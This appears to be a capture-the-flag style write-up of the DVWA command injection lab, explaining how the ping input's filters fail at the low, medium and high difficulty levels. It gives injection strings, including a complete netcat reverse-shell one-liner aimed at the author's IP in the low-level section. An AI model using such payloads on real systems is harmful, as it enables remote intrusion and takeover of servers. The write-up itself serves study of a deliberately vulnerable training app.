# Difficulty - Low

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/Command%20Injection/Sources/low.php)

The php script will run the `shell_exec( 'ping  ' . $target )` without filtering the `$target`.

So, a ping like that :
> 0.0.0.0 && ls 

Will return :
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/Command%20Injection/Pictures/1.png)


A ping like that:
> 0.0.0.0 ; rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc  10.X.X.X 1234 4242 >/tmp/f
Where 10.X.X.X is my ip will return a reverse shell on the 1234 port:
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/Command%20Injection/Pictures/2.png)


# Difficulty - Medium

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/Command%20Injection/Sources/medium.php)

The php script will run the `shell_exec( 'ping  ' . $target )` replacing `&&` and `;` with `''`.
But it does not replace the `&` character (run in background).

So, a ping like that :
> 0.0.0.0 & ls 

Will return :
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/Command%20Injection/Pictures/3.png)

We can use that character for reverse shell either.


# Difficulty - High

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/Command%20Injection/Sources/high.php)

The php script is now replacing `&`, `;`, `|`, `-`, `$`, `(`, `)`, `||`.

But after a few shots I got this:
![...](https://github.com/PnzJust/DVWA-v1.10/blob/main/Command%20Injection/Pictures/4.png)

We can use that character for reverse shell either.


# Difficulty - Impossible

[Challange source code](https://github.com/PnzJust/DVWA-v1.10/blob/main/Command%20Injection/Sources/impossible.php)
